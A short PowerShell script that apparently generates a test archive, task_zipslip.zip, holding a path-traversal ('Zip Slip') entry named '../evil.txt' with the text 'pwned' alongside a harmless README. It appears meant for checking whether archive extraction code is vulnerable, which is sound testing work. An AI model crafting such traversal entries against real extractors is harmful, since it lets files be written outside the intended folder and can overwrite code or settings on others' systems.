# make_zipslip.ps1
# Generates task_zipslip.zip that contains a zip-slip entry "../evil.txt"

$ErrorActionPreference = "Stop"

Remove-Item -Force .\task_zipslip.zip -ErrorAction SilentlyContinue
Remove-Item -Force .\evil.txt -ErrorAction SilentlyContinue

Add-Type -AssemblyName System.IO.Compression
Add-Type -AssemblyName System.IO.Compression.FileSystem

$zipPath = Join-Path (Get-Location) "task_zipslip.zip"
if (Test-Path $zipPath) { Remove-Item -Force $zipPath }

$zip = [System.IO.Compression.ZipFile]::Open($zipPath, [System.IO.Compression.ZipArchiveMode]::Create)
try {
  # Zip Slip entry
  $e = $zip.CreateEntry("../evil.txt")
  $sw = New-Object System.IO.StreamWriter($e.Open(), (New-Object System.Text.UTF8Encoding($false)))
  $sw.Write("pwned")
  $sw.Dispose()

  # Normal entry
  $e2 = $zip.CreateEntry("README.txt")
  $sw2 = New-Object System.IO.StreamWriter($e2.Open(), (New-Object System.Text.UTF8Encoding($false)))
  $sw2.Write("this zip contains a zip-slip entry")
  $sw2.Dispose()
}
finally {
  $zip.Dispose()
}

Write-Host "Generated: $zipPath"
Get-Item .\task_zipslip.zip
